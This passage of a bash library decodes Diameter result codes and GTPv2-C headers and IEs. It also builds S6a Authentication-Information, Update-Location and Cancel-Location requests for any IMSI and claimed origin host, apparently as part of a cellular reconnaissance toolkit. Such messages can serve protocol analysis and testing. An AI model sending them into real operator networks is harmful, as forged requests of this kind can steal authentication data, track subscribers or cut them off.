        1490)    echo "IDR-Flags" ;;
        1491)    echo "ICS-Indicator" ;;
        1492)    echo "IMS-Voice-Over-PS-Sessions-Supported" ;;
        1493)    echo "Homogeneous-Support-of-IMS-Voice-Over-PS-Sessions" ;;
        1494)    echo "Last-UE-Activity-Time" ;;
        1495)    echo "EPS-User-State" ;;
        1496)    echo "EPS-Location-Information" ;;
        1497)    echo "MME-User-State" ;;
        1498)    echo "SGSN-User-State" ;;
        1499)    echo "User-State" ;;
        1600)    echo "MME-LocationInformation" ;;
        1601)    echo "SGSN-Location-Information" ;;
        1602)    echo "E-UTRAN-Cell-Global-Identity" ;;
        1603)    echo "Tracking-Area-Identity" ;;
        1604)    echo "Cell-Global-Identity" ;;
        1605)    echo "Routing-Area-Identity" ;;
        1606)    echo "Location-Area-Identity" ;;
        1607)    echo "Service-Area-Identity" ;;
        1608)    echo "Geographical-Information" ;;
        1609)    echo "Geodetic-Information" ;;
        1610)    echo "Current-Location-Retrieved" ;;
        1611)    echo "Age-Of-Location-Information" ;;
        1612)    echo "Active-APN" ;;
        1613)    echo "SIPTO-Permission" ;;
        1614)    echo "Error-Diagnostic" ;;
        1615)    echo "UE-SRVCC-Capability" ;;
        1616)    echo "MPS-Priority" ;;
        1617)    echo "VPLMN-LIPA-Allowed" ;;
        1618)    echo "LIPA-Permission" ;;
        1619)    echo "Subscribed-Periodic-RAU-TAU-Timer" ;;
        1621)    echo "Ext-PDP-Address" ;;
        1622)    echo "MDT-Configuration" ;;
        1623)    echo "Job-Type" ;;
        1624)    echo "Area-Scope" ;;
        1625)    echo "List-Of-Measurements" ;;
        1626)    echo "Reporting-Trigger" ;;
        1627)    echo "Report-Interval" ;;
        1628)    echo "Report-Amount" ;;
        1629)    echo "Event-Threshold-RSRP" ;;
        1630)    echo "Event-Threshold-RSRQ" ;;
        1631)    echo "Logging-Interval" ;;
        1632)    echo "Logging-Duration" ;;
        1633)    echo "Relay-Node-Indicator" ;;
        1634)    echo "MDT-User-Consent" ;;
        1635)    echo "PUR-Flags" ;;
        1636)    echo "Subscribed-VSRVCC" ;;
        1637)    echo "Equivalent-PLMN-List" ;;
        1638)    echo "CLR-Flags" ;;
        1639)    echo "UVR-Flags" ;;
        1640)    echo "UVA-Flags" ;;
        1641)    echo "VPLMN-CSG-Subscription-Data" ;;
        1642)    echo "Time-Zone" ;;
        1643)    echo "A-MSISDN" ;;
        1645)    echo "MME-Number-for-MT-SMS" ;;
        1648)    echo "SMS-Register-Request" ;;
        1649)    echo "Local-Time-Zone" ;;
        1650)    echo "Daylight-Saving-Time" ;;
        1654)    echo "Subscription-Data-Flags" ;;
        1655)    echo "Measurement-Period-LTE" ;;
        1656)    echo "Measurement-Period-UMTS" ;;
        1657)    echo "Collection-Period-RRM-LTE" ;;
        1658)    echo "Collection-Period-RRM-UMTS" ;;
        1659)    echo "Positioning-Method" ;;
        1660)    echo "Measurement-Quantity" ;;
        1661)    echo "Event-Threshold-Event-1F" ;;
        1662)    echo "Event-Threshold-Event-1I" ;;
        1663)    echo "Restoration-Priority" ;;
        1664)    echo "SGs-MME-Identity" ;;
        1665)    echo "SIPTO-Local-Network-Permission" ;;
        1666)    echo "Coupled-Node-Diameter-ID" ;;
        1667)    echo "WLAN-offloadability" ;;
        1668)    echo "WLAN-offloadability-EUTRAN" ;;
        1669)    echo "WLAN-offloadability-UTRAN" ;;
        1670)    echo "Reset-ID" ;;
        1671)    echo "MDT-Allowed-PLMN-Id" ;;
        1672)    echo "Adjacent-PLMNs" ;;
        1673)    echo "Adjacent-Access-Restriction-Data" ;;
        1674)    echo "DL-Buffering-Suggested-Packet-Count" ;;
        1675)    echo "IMSI-Group-Id" ;;
        1676)    echo "Group-Service-Id" ;;
        1677)    echo "Group-PLMN-Id" ;;
        1678)    echo "Local-Group-Id" ;;
        1679)    echo "AIR-Flags" ;;
        1680)    echo "UE-Usage-Type" ;;
        1681)    echo "Non-IP-PDN-Type-Indicator" ;;
        1682)    echo "Non-IP-Data-Delivery-Mechanism" ;;
        1683)    echo "Additional-Context-ID" ;;
        1684)    echo "SCEF-Realm" ;;
        1685)    echo "Subscription-Data-Deletion" ;;
        1686)    echo "Preferred-Data-Mode" ;;
        1687)    echo "Emergency-Info" ;;
        1688)    echo "V2X-Subscription-Data" ;;
        1689)    echo "V2X-Permission" ;;
        1690)    echo "PDN-Connection-Continuity" ;;
        1691)    echo "eDRX-Cycle-Length" ;;
        1692)    echo "eDRX-Cycle-Length-Value" ;;
        1693)    echo "UE-PC5-AMBR" ;;
        1694)    echo "MBSFN-Area" ;;
        1695)    echo "MBSFN-Area-ID" ;;
        1696)    echo "Carrier-Frequency" ;;
        1697)    echo "RDS-Indicator" ;;
        1698)    echo "Service-Gap-Time" ;;
        1699)    echo "Aerial-UE-Subscription-Information" ;;
        1700)    echo "Broadcast-Location-Assistance-Data-Types" ;;
        1701)    echo "Paging-Time-Window" ;;
        1702)    echo "Operation-Mode" ;;
        1703)    echo "Paging-Time-Window-Length" ;;
        1704)    echo "Core-Network-Restrictions" ;;
        1705)    echo "eDRX-Related-RAT" ;;
        1706)    echo "Interworking-5GS-Indicator" ;;
        1032)    echo "RAT-Type" ;;
        *)     echo "unknown AVP code $1" ;;
    esac
}

# Result-Code — RFC 6733 §7.1 plus TS 29.272 §7.4.
lcore_diameter_result_code() {
    # RFC 6733 §7.1.1 (informational) and §7.1.2 (success, protocol errors,
    # transient and permanent failures). These are the values of the
    # Result-Code AVP (268) and of Experimental-Result-Code (298) when a
    # 3GPP code is not in play.
    case "${1:-}" in
        1001)    echo "DIAMETER_MULTI_ROUND_AUTH (1001)" ;;
        2001)    echo "DIAMETER_SUCCESS (2001)" ;;
        2002)    echo "DIAMETER_LIMITED_SUCCESS (2002)" ;;
        3001)    echo "DIAMETER_COMMAND_UNSUPPORTED (3001)" ;;
        3002)    echo "DIAMETER_UNABLE_TO_DELIVER (3002)" ;;
        3003)    echo "DIAMETER_REALM_NOT_SERVED (3003)" ;;
        3004)    echo "DIAMETER_TOO_BUSY (3004)" ;;
        3005)    echo "DIAMETER_LOOP_DETECTED (3005)" ;;
        3006)    echo "DIAMETER_REDIRECT_INDICATION (3006)" ;;
        3007)    echo "DIAMETER_APPLICATION_UNSUPPORTED (3007)" ;;
        3008)    echo "DIAMETER_INVALID_HDR_BITS (3008)" ;;
        3009)    echo "DIAMETER_INVALID_AVP_BITS (3009)" ;;
        3010)    echo "DIAMETER_UNKNOWN_PEER (3010)" ;;
        4001)    echo "DIAMETER_AUTHENTICATION_REJECTED (4001)" ;;
        4002)    echo "DIAMETER_OUT_OF_SPACE (4002)" ;;
        5001)    echo "DIAMETER_AVP_UNSUPPORTED (5001)" ;;
        5002)    echo "DIAMETER_UNKNOWN_SESSION_ID (5002)" ;;
        5003)    echo "DIAMETER_AUTHORIZATION_REJECTED (5003)" ;;
        5004)    echo "DIAMETER_INVALID_AVP_VALUE (5004)" ;;
        5005)    echo "DIAMETER_MISSING_AVP (5005)" ;;
        5006)    echo "DIAMETER_RESOURCES_EXCEEDED (5006)" ;;
        5007)    echo "DIAMETER_CONTRADICTING_AVPS (5007)" ;;
        5008)    echo "DIAMETER_AVP_NOT_ALLOWED (5008)" ;;
        5009)    echo "DIAMETER_AVP_OCCURS_TOO_MANY_TIMES (5009)" ;;
        5010)    echo "DIAMETER_NO_COMMON_APPLICATION (5010)" ;;
        5011)    echo "DIAMETER_UNSUPPORTED_VERSION (5011)" ;;
        5012)    echo "DIAMETER_UNABLE_TO_COMPLY (5012)" ;;
        5013)    echo "DIAMETER_INVALID_BIT_IN_HEADER (5013)" ;;
        5014)    echo "DIAMETER_INVALID_AVP_LENGTH (5014)" ;;
        5015)    echo "DIAMETER_INVALID_MESSAGE_LENGTH (5015)" ;;
        5016)    echo "DIAMETER_INVALID_AVP_BIT_COMBO (5016)" ;;
        5017)    echo "DIAMETER_NO_COMMON_SECURITY (5017)" ;;
        *)    echo "unassigned Diameter result code ($1)" ;;
    esac
}

# Experimental-Result-Code (AVP 298) values of TS 29.272 §7.4. A 3GPP result
# code is carried there and the Result-Code AVP is then absent (§7.4.3).
lcore_diameter_exp_result_code() {
    case "${1:-}" in
        4181)    echo "DIAMETER_AUTHENTICATION_DATA_UNAVAILABLE (4181)" ;;
        4182)    echo "DIAMETER_ERROR_CAMEL_SUBSCRIPTION_PRESENT (4182)" ;;
        5001)    echo "DIAMETER_ERROR_USER_UNKNOWN (5001)" ;;
        5004)    echo "DIAMETER_ERROR_ROAMING_NOT_ALLOWED (5004)" ;;
        5420)    echo "DIAMETER_ERROR_UNKNOWN_EPS_SUBSCRIPTION (5420)" ;;
        5421)    echo "DIAMETER_ERROR_RAT_NOT_ALLOWED (5421)" ;;
        5422)    echo "DIAMETER_ERROR_EQUIPMENT_UNKNOWN (5422)" ;;
        5423)    echo "DIAMETER_ERROR_UNKOWN_SERVING_NODE (5423)" ;;
        *)    echo "unassigned 3GPP experimental result code ($1)" ;;
    esac
}

# Diameter data is not always UTF-8; render printable bytes as text and
# anything else as hex, so a name carrying a tab cannot reach a TSV row.
lcore_diameter_utf8() {
    local hex; hex=$(lcore_nfc "${1:-}")
    [[ -n "$hex" ]] || { printf ''; return 0; }
    (( ${#hex} % 2 == 0 )) || { printf '%s' "$hex"; return 0; }
    local out="" i b
    for (( i = 0; i < ${#hex}; i += 2 )); do
        b=$(( 16#${hex:$i:2} ))
        if (( b >= 32 && b < 127 )); then
            # Accumulate the escape text directly. Wrapping this in
            # "$(printf ...)" lets the inner printf consume the backslash
            # as a format escape, which silently yields an empty value.
            out+="\\x${hex:$i:2}"
        else
            # Non-printable: fall back to the raw hex for the whole value.
            printf '%s' "$hex"
            return 0
        fi
    done
    printf '%b' "$out" | lcore_sanitize_stream
    return 0
}

# Sanitiser for a pipeline: lcore_sanitize takes its text as an argument
# (matching the contract in 02_cell_recon.sh), so piping into it yields
# nothing. This variant reads stdin.
lcore_sanitize_stream() {
    tr '\t\r\n' '   '
}

# PLMN as it appears inside a GTP-C TAI/ECGI/ULI and a Diameter
# Visited-PLMN-Id: the same reversed-nibble BCD as the air interface
# (TS 23.003 §12.1, referenced by TS 29.274 §8.21 and TS 29.272 §7.3.50).
#
#   octet 1 : MCC digit 2 (high) | MCC digit 1 (low)
#   octet 2 : MNC digit 3 (high) | MCC digit 3 (low)   -- F high = 2-digit MNC
#   octet 3 : MNC digit 2 (high) | MNC digit 1 (low)
lcore_plmn_from_octets() {
    local hex; hex=$(lcore_nfc "${1:-}")
    [[ ${#hex} -ge 6 ]] || return 1
    local mcc mnc d3="${hex:2:1}"
    mcc="$(printf '%d%d%d' $((16#${hex:1:1})) $((16#${hex:0:1})) $((16#${hex:3:1})))"
    mnc="$(printf '%d%d' $((16#${hex:5:1})) $((16#${hex:4:1})))"
    if [[ "$d3" != "F" && "$d3" != "f" ]]; then
        mnc+="$(printf '%d' $((16#$d3)))"
    fi
    printf '%s-%s' "$mcc" "$mnc"
}

# ── Diameter message building ───────────────────────────────────────────
lcore_diameter_build_msg() {
    local cmd="$1" appid="$2" flags="$3" hbh="$4" e2e="$5" avps="$6"
    local body; body=$(lcore_nfc "${avps:-}")
    local len=$(( 20 + ${#body} / 2 ))
    printf '%02X%06X%02X%06X%08X%08X%08X%s' \
        1 "$len" "$flags" "$cmd" "$appid" "$hbh" "$e2e" "$body"
}

# Build a single AVP. Flags are given as a letter string: V/M/P.
lcore_diameter_build_avp() {
    local code="$1" data="$2" flagstr="${3:-M}" vid="${4:-}"
    local v=0 m=0 p=0
    [[ "$flagstr" == *V* ]] && v=1
    [[ "$flagstr" == *M* ]] && m=1
    [[ "$flagstr" == *P* ]] && p=1
    local f=$(( (v << 7) | (m << 6) | (p << 5) ))
    local d; d=$(lcore_nfc "$data")
    local dlen=$(( ${#d} / 2 ))
    local hdr=8
    (( v == 1 )) && hdr=12
    local alen=$(( hdr + dlen ))
    local pad=$(( (4 - (alen % 4)) % 4 ))
    local out
    if (( v == 1 )); then
        out=$(printf '%08X%02X%06X%08X%s' "$code" "$f" "$alen" "${vid:-10415}" "$d")
    else
        out=$(printf '%08X%02X%06X%s' "$code" "$f" "$alen" "$d")
    fi
    local i
    for (( i = 0; i < pad; i++ )); do out+="00"; done
    printf '%s' "$out"
}

lcore_diameter_build_utf8_avp() {
    local code="$1" text="$2" flagstr="${3:-M}" vid="${4:-}"
    local hex=""
    local i
    for (( i = 0; i < ${#text}; i++ )); do
        hex+=$(printf '%02X' "'${text:$i:1}")
    done
    lcore_diameter_build_avp "$code" "$hex" "$flagstr" "$vid"
}

lcore_diameter_build_u32_avp() {
    local code="$1" val="$2" flagstr="${3:-M}" vid="${4:-}"
    printf -v h '%08X' "$val"
    lcore_diameter_build_avp "$code" "$h" "$flagstr" "$vid"
}

# ── S6a/S6d message builders ────────────────────────────────────────────
#
# Application-Id for S6a/S6d is 16777251 (0x0100001B) per TS 29.272 §7.1.
# A request has the R and P flags set: 0xC0.
lcore_diameter_origin_avps() {
    # RFC 6733 §4.1 / TS 29.272 §7.2: Origin-Host 264, Origin-Realm 296,
    # Destination-Realm 283, Auth-Session-State 277. 285 is
    # Re-Auth-Request-Type, so it was both mislabelled here and left the
    # mandatory Destination-Realm out of every built message.
    local origin_host="$1" origin_realm="$2" dest_realm="${3:-$2}"
    printf '%s%s%s%s' \
        "$(lcore_diameter_build_utf8_avp 264 "$origin_host" M)" \
        "$(lcore_diameter_build_utf8_avp 296 "$origin_realm" M)" \
        "$(lcore_diameter_build_utf8_avp 283 "$dest_realm" M)" \
        "$(lcore_diameter_build_u32_avp 277 0 M)"
}

lcore_build_air() {
    local imsi="${1:-310150123456789}" origin_host="${2:-mme.localdomain}" \
          origin_realm="${3:-localdomain}" nvectors="${4:-1}" \
          visited_plmn="${5:-02F810}"
    [[ "$imsi" =~ ^[0-9]{14,15}$ ]] || {
        printf 'ERROR\tIMSI must be 14 or 15 digits: %s\n' "$(lcore_sanitize "${imsi:-<none>}")" >&2
        return 2
    }
    [[ "$nvectors" =~ ^[0-9]+$ ]] && (( nvectors >= 1 && nvectors <= 5 )) || {
        printf 'ERROR\tNumber-Of-Requested-Vectors must be 1..5\n' >&2; return 2
    }

    # Session-Id: <origin-host>;<high>;<low>  (RFC 6733 §8.8)
    local sid="${origin_host};$(printf '%08X' $$);$(printf '%08X' 1)"
    local session_avp; session_avp=$(lcore_diameter_build_utf8_avp 263 "$sid" M)

    # User-Name carries the *IMSI as digits*, not BCD (TS 29.272 §7.3.2).
    local uname_avp; uname_avp=$(lcore_diameter_build_utf8_avp 1 "$imsi" M)

    # Visited-PLMN-Id is an OctetString of plain BCD digits (TS 29.272 §7.3.50).
    local vplmn_avp; vplmn_avp=$(lcore_diameter_build_avp 1407 "$(lcore_nfc "$visited_plmn")" M)

    # Requested-EUTRAN-Authentication-Info is a GROUPED AVP (TS 29.272
    # §7.3.55) holding Number-Of-Requested-Vectors and
    # Immediate-Response-Preferred.
    local nuri; nuri=$(lcore_diameter_build_u32_avp 1410 "$nvectors" M)
    local irp;  irp=$(lcore_diameter_build_u32_avp 1412 0 M)
    local reai; reai=$(lcore_diameter_build_avp 1408 "${nuri}${irp}" M)

    local avps
    avps="$(lcore_diameter_origin_avps "$origin_host" "$origin_realm")${session_avp}${uname_avp}${vplmn_avp}${reai}"

    local msg; msg=$(lcore_diameter_build_msg 318 16777251 192 1 1 "$avps")
    printf '%s' "$msg"
}

lcore_build_ulr() {
    local imsi="${1:-310150123456789}" origin_host="${2:-mme.localdomain}" \
          origin_realm="${3:-localdomain}" visited_plmn="${4:-02F810}" \
          rat_type="${5:-6}" ulr_flags="${6:-0}"
    [[ "$imsi" =~ ^[0-9]{14,15}$ ]] || {
        printf 'ERROR\tIMSI must be 14 or 15 digits: %s\n' "$(lcore_sanitize "${imsi:-<none>}")" >&2
        return 2
    }
    local sid="${origin_host};$(printf '%08X' $$);$(printf '%08X' 2)"
    local session_avp; session_avp=$(lcore_diameter_build_utf8_avp 263 "$sid" M)
    local uname_avp;   uname_avp=$(lcore_diameter_build_utf8_avp 1 "$imsi" M)
    local vplmn_avp;   vplmn_avp=$(lcore_diameter_build_avp 1407 "$(lcore_nfc "$visited_plmn")" M)
    # ULR-Flags is AVP 1405 (§7.3.7) and RAT-Type is AVP 1032, defined in
    # TS 29.212 and reused here (§7.3.13), which means a vendor-specific
    # AVP carrying Vendor-Id 10415 (3GPP).
    local flags_avp;   flags_avp=$(lcore_diameter_build_u32_avp 1405 "$ulr_flags" M)
    local rat_avp;     rat_avp=$(lcore_diameter_build_u32_avp 1032 "$rat_type" MV 10415)

    local avps
    avps="$(lcore_diameter_origin_avps "$origin_host" "$origin_realm")${session_avp}${uname_avp}${vplmn_avp}${flags_avp}${rat_avp}"
    lcore_diameter_build_msg 316 16777251 192 2 2 "$avps"
}

lcore_build_clr() {
    local imsi="${1:-310150123456789}" origin_host="${2:-hss.localdomain}" \
          origin_realm="${3:-localdomain}" canc_type="${4:-0}"
    [[ "$imsi" =~ ^[0-9]{14,15}$ ]] || {
        printf 'ERROR\tIMSI must be 14 or 15 digits\n' >&2; return 2
    }
    local sid="${origin_host};$(printf '%08X' $$);$(printf '%08X' 3)"
    local session_avp; session_avp=$(lcore_diameter_build_utf8_avp 263 "$sid" M)
    # Cancel-Location-Request carries the User-Name (IMSI) and
    # Cancellation-Type (TS 29.272 §7.3.24): 0 = UPDATE_PROCEDURE,
    # 1 = INITIAL_ATTACH_PROCEDURE, 2 = SUBSCRIPTION_WITHDRAWAL,
    # 3 = UPDATE_PROCEDURE_IWF, 4 = INITIAL_ATTACH_PROCEDURE_IWF.
    local uname_avp; uname_avp=$(lcore_diameter_build_utf8_avp 1 "$imsi" M)
    local ct_avp;    ct_avp=$(lcore_diameter_build_u32_avp 1420 "$canc_type" M)
    local avps
    avps="$(lcore_diameter_origin_avps "$origin_host" "$origin_realm")${session_avp}${uname_avp}${ct_avp}"
    lcore_diameter_build_msg 317 16777251 192 3 3 "$avps"
}

# ── GTP-C v2 — TS 29.274 §5.1 ───────────────────────────────────────────
#
# Flags octet:
#   bit 8 : Version (2 for GTPv2)
#   bit 7 : P    Piggybacking
#   bit 6 : T    TEID present
#   bit 5 : MP   (spare, must be 0)
#   bits 4..1 : Message Type
#   bit 0 : spare (must be 0)
# Message Type is therefore in the *high* bits of octet 2... no: the flags
# byte is followed by the 1-octet Message Type, so the type is a full octet.
#
#   octet 0      : Flags
#   octet 1      : Message Type
#   octets 2..3  : Message Length (payload after the first 4 octets)
#   octets 4..7  : TEID (only when T=1)
#   octets n..n+2: Sequence Number (24-bit)
#   octet  n+3   : Spare
lcore_gtpc_parse_header() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    (( ${#hex} >= 8 )) || { printf 'ERROR\tGTP-C message shorter than 4 octets\n' >&2; return 1; }

    local flags="${hex:0:2}"
    local fv=$(( 16#$flags ))
    local ver=$(( (fv >> 5) & 0x07 ))
    local pt=$((  (fv >> 4) & 0x01 ))
    local tbit=$(( (fv >> 3) & 0x01 ))
    local mtype="${hex:2:2}"
    local len=$(( 16#${hex:4:2} * 256 + 16#${hex:6:2} ))

    printf 'version\t%s\n' "$ver"
    printf 'protocol\t%s\n' "$([[ $ver -eq 2 ]] && echo 'GTPv2-C' || echo "GTPv$ver")"
    printf 'flags\t%s\n' "$flags"
    printf 'flag_P\t%s\n' "$pt"
    printf 'flag_T\t%s\n' "$tbit"
    printf 'flag_MP\t%s\n' "$(( (fv >> 2) & 0x01 ))"
    printf 'spare_bits\t%s\n' "$(( fv & 0x03 ))"
    printf 'message_type\t%s\n' "$((16#$mtype))"
    printf 'message_name\t%s\n' "$(lcore_gtpc_msg_name "$((16#$mtype))")"
    printf 'length\t%s\n' "$len"
    local frame_after=$(( ${#hex} / 2 - 4 ))
    printf 'length_agrees\t%s\n' "$([[ $len -eq $frame_after ]] && echo yes || echo no)"
    (( len == frame_after )) || printf 'note\tlength field says %d octets after it, the frame carries %d\n' "$len" "$frame_after"
    (( ver == 2 )) || { printf 'ERROR\tGTP-C header says version %d; TS 29.274 §5.1 fixes the version at 2\n' "$ver" >&2; return 1; }

    local off=4
    if (( tbit == 1 )); then
        (( ${#hex} >= 16 )) || { printf 'ERROR\tT flag set but no TEID present\n' >&2; return 1; }
        local teid=$(( 16#${hex:8:2} * 16777216 + 16#${hex:10:2} * 65536 + 16#${hex:12:2} * 256 + 16#${hex:14:2} ))
        printf 'teid\t%s\n' "$teid"
        printf 'teid_hex\t%s\n' "${hex:8:8}"
        off=8
    else
        printf 'teid\tnone\n'
    fi
    # Sequence Number is 24 bits + 1 spare octet.
    (( ${#hex} >= (off + 4) * 2 )) || { printf 'ERROR\tGTP-C message truncated before the sequence number\n' >&2; return 1; }
    local b=$(( off * 2 ))
    local seq=$(( 16#${hex:$b:2} * 65536 + 16#${hex:$((b+2)):2} * 256 + 16#${hex:$((b+4)):2} ))
    printf 'sequence_number\t%s\n' "$seq"
    if (( (fv >> 2) & 0x01 )); then
        # TS 29.274 Figure 5.1-2: with MP=1 the fourth trailer octet is the
        # Message Priority in bits 8-5 and spare in bits 4-1.
        local tr=$(( 16#${hex:$((b+6)):2} ))
        printf 'spare\tnone (bits 4-1 carry spare %d)\n' "$(( tr & 0x0F ))"
        printf 'message_priority\t%s\n' "$(( (tr >> 4) & 0x0F ))"
    else
        printf 'spare\t%s\n' "${hex:$((b+6)):2}"
        printf 'message_priority\tnone\n'
    fi
    printf 'payload\t%s\n' "${hex:$((b+8))}"
    printf 'payload_octets\t%s\n' "$(( ${#hex} / 2 - off - 4 ))"
    return 0
}

# Message Type — TS 29.274 Table 6.1-1.
lcore_gtpc_msg_name() {
    # Message Type — TS 29.274 Table 6.1-1. The argument is decimal.
    # The Identification and Context messages at 128-132 are the ones a
    # Mobility Management entity uses on S10/S16, not bearer messages.
    local t="${1:-0}"
    [[ "$t" =~ ^[0-9]+$ ]] || { echo "unknown/extension message type"; return 0; }
    if (( t >= 4 && t <= 16 )); then echo "Reserved for the S101 interface (TS 29.276)"; return 0; fi
    if (( t >= 17 && t <= 24 )); then echo "Reserved for the S121 interface (TS 29.276)"; return 0; fi
    if (( t >= 25 && t <= 31 )); then echo "Reserved for the Sv interface (TS 29.280)"; return 0; fi
    if (( t >= 42 && t <= 63 )); then echo "For future use"; return 0; fi
    if (( t >= 74 && t <= 94 )); then echo "For future use"; return 0; fi
    if (( t >= 105 && t <= 127 )); then echo "For future use"; return 0; fi
    if (( t >= 142 && t <= 148 )); then echo "For future use"; return 0; fi
    if (( t >= 172 && t <= 175 )); then echo "For future use"; return 0; fi
    if (( t == 178 )); then echo "Reserved (allocated in an earlier version of TS 29.274)"; return 0; fi
    if (( t >= 181 && t <= 199 )); then echo "For future use"; return 0; fi
    if (( t >= 202 && t <= 210 )); then echo "For future use"; return 0; fi
    if (( t >= 213 && t <= 230 )); then echo "For future use"; return 0; fi
    if (( t >= 237 && t <= 239 )); then echo "For future use"; return 0; fi
    if (( t >= 240 && t <= 247 )); then echo "Reserved for the Sv interface (TS 29.280)"; return 0; fi
    if (( t >= 248 && t <= 255 )); then echo "For future use"; return 0; fi
    case "$t" in
        1)	echo "Echo Request" ;;
        2)	echo "Echo Response" ;;
        3)	echo "Version Not Supported Indication" ;;
        32)	echo "Create Session Request" ;;
        33)	echo "Create Session Response" ;;
        34)	echo "Modify Bearer Request" ;;
        35)	echo "Modify Bearer Response" ;;
        36)	echo "Delete Session Request" ;;
        37)	echo "Delete Session Response" ;;
        38)	echo "Change Notification Request" ;;
        39)	echo "Change Notification Response" ;;
        40)	echo "Remote UE Report Notification" ;;
        41)	echo "Remote UE Report Acknowledge" ;;
        64)	echo "Modify Bearer Command" ;;
        65)	echo "Modify Bearer Failure Indication" ;;
        66)	echo "Delete Bearer Command" ;;
        67)	echo "Delete Bearer Failure Indication" ;;
        68)	echo "Bearer Resource Command" ;;
        69)	echo "Bearer Resource Failure Indication" ;;
        70)	echo "Downlink Data Notification Failure Indication" ;;
        71)	echo "Trace Session Activation" ;;
        72)	echo "Trace Session Deactivation" ;;
        73)	echo "Stop Paging Indication" ;;
        95)	echo "Create Bearer Request" ;;
        96)	echo "Create Bearer Response" ;;
        97)	echo "Update Bearer Request" ;;
        98)	echo "Update Bearer Response" ;;
        99)	echo "Delete Bearer Request" ;;
        100)	echo "Delete Bearer Response" ;;
        101)	echo "Delete PDN Connection Set Request" ;;
        102)	echo "Delete PDN Connection Set Response" ;;
        103)	echo "PGW Downlink Triggering Notification" ;;
        104)	echo "PGW Downlink Triggering Acknowledge" ;;
        128)	echo "Identification Request" ;;
        129)	echo "Identification Response" ;;
        130)	echo "Context Request" ;;
        131)	echo "Context Response" ;;
        132)	echo "Context Acknowledge" ;;
        133)	echo "Forward Relocation Request" ;;
        134)	echo "Forward Relocation Response" ;;
        135)	echo "Forward Relocation Complete Notification" ;;
        136)	echo "Forward Relocation Complete Acknowledge" ;;
        137)	echo "Forward Access Context Notification" ;;
        138)	echo "Forward Access Context Acknowledge" ;;
        139)	echo "Relocation Cancel Request" ;;
        140)	echo "Relocation Cancel Response" ;;
        141)	echo "Configuration Transfer Tunnel" ;;
        149)	echo "Detach Notification" ;;
        150)	echo "Detach Acknowledge" ;;
        151)	echo "CS Paging Indication" ;;
        152)	echo "RAN Information Relay" ;;
        153)	echo "Alert MME Notification" ;;
        154)	echo "Alert MME Acknowledge" ;;
        155)	echo "UE Activity Notification" ;;
        156)	echo "UE Activity Acknowledge" ;;
        157)	echo "ISR Status Indication" ;;
        158)	echo "UE Registration Query Request" ;;
        159)	echo "UE Registration Query Response" ;;
        160)	echo "Create Forwarding Tunnel Request" ;;
        161)	echo "Create Forwarding Tunnel Response" ;;
        162)	echo "Suspend Notification" ;;
        163)	echo "Suspend Acknowledge" ;;
        164)	echo "Resume Notification" ;;
        165)	echo "Resume Acknowledge" ;;
        166)	echo "Create Indirect Data Forwarding Tunnel Request" ;;
        167)	echo "Create Indirect Data Forwarding Tunnel Response" ;;
        168)	echo "Delete Indirect Data Forwarding Tunnel Request" ;;
        169)	echo "Delete Indirect Data Forwarding Tunnel Response" ;;
        170)	echo "Release Access Bearers Request" ;;
        171)	echo "Release Access Bearers Response" ;;
        176)	echo "Downlink Data Notification" ;;
        177)	echo "Downlink Data Notification Acknowledge" ;;
        179)	echo "PGW Restart Notification" ;;
        180)	echo "PGW Restart Notification Acknowledge" ;;
        200)	echo "Update PDN Connection Set Request" ;;
        201)	echo "Update PDN Connection Set Response" ;;
        211)	echo "Modify Access Bearers Request" ;;
        212)	echo "Modify Access Bearers Response" ;;
        231)	echo "MBMS Session Start Request" ;;
        232)	echo "MBMS Session Start Response" ;;
        233)	echo "MBMS Session Update Request" ;;
        234)	echo "MBMS Session Update Response" ;;
        235)	echo "MBMS Session Stop Request" ;;
        236)	echo "MBMS Session Stop Response" ;;
        *)   echo "unknown/extension message type" ;;
    esac
}

# ── GTP-C IE — TS 29.274 §8.1 ───────────────────────────────────────────
#
#   octet 0      : Type
#   octets 1..2  : Length (payload octets after this 4-octet header)
#   octet 3      : Spare (high nibble, must be 0) | Instance (low nibble)
#   octets 4..   : Value
# Walk a GTP-C IE stream. The second argument picks how the next IE is found:
#   pad    (default) — IEs padded to a 4-octet boundary, padding not counted
#                      in Length. This is what the functions above emit and
#                      what tools/gtp-oracle walks.
#   exact  — no padding: the next IE starts at 4+Length, which is how tshark
#                      reads a GTPv2-C stream. Used by --mbms-session.
lcore_gtpc_parse_ies() {
    local hex; hex=$(lcore_nfc "${1:-}")
    # Default is exact: TS 29.274 §8.2 gives an IE a 4-octet header and a Length
    # that is the real value length, with nothing after it. The pad mode stays
    # only to read captures produced by older versions of this tree, which
    # padded every IE to a 4-octet boundary -- the convention of GTPv1-C
    # (TS 29.060), not GTPv2-C. A padded message is what tshark calls
    # "[Malformed Packet: GTPv2]", so the default must not be the mode that
    # reads it.
    local mode="${2:-exact}"
    case "$mode" in pad|exact) ;; *) printf 'ERROR\tIE walk mode is pad or exact, got %s\n' "$(lcore_sanitize "$mode")" >&2; return 1 ;; esac
    lcore_is_hex "$hex" || return 1
    local off=0 total=$(( ${#hex} / 2 ))
    local n=0
    while (( off + 4 <= total )); do
        local base=$(( off * 2 ))
        local t="${hex:$base:2}"
        local len=$(( 16#${hex:$((base+2)):2} * 256 + 16#${hex:$((base+4)):2} ))
        local si="${hex:$((base+6)):2}"
        local sval=$(( 16#$si ))
        (( off + 4 + len <= total )) || {
            printf 'ERROR\tGTP-C IE type %s claims %s value octets but only %s remain\n' \
                "$((16#$t))" "$len" "$(( total - off - 4 ))" >&2
            return 1
        }
        local val="${hex:$((base+8)):$((len*2))}"
        printf 'ie.%d.type\t%s\n' "$n" "$((16#$t))"
        printf 'ie.%d.name\t%s\n' "$n" "$(lcore_gtpc_ie_name "$((16#$t))")"
        printf 'ie.%d.length\t%s\n' "$n" "$len"
        printf 'ie.%d.spare\t%s\n' "$n" "$(( (sval >> 4) & 0x0F ))"
        printf 'ie.%d.instance\t%s\n' "$n" "$(( sval & 0x0F ))"
        printf 'ie.%d.value\t%s\n' "$n" "$val"
        # Typed rendering for the IEs a core-network analyst reads first.
        # Numbers and labels are TS 29.274 Table 8.1-1; the value layouts are
        # the clause named next to each one.
        case "$((16#$t))" in
            1)  printf 'ie.%d.decoded\tIMSI=%s\n' "$n" "$(lcore_tbcd_decode "$val")" ;;              # §8.3
            2)  printf 'ie.%d.decoded\tCause=%s\n' "$n" "$((16#${val:0:2}))" ;;                      # §8.4
            3)  printf 'ie.%d.decoded\tRecovery=%s\n' "$n" "$((16#${val:0:2}))" ;;                   # §8.5, 1 octet
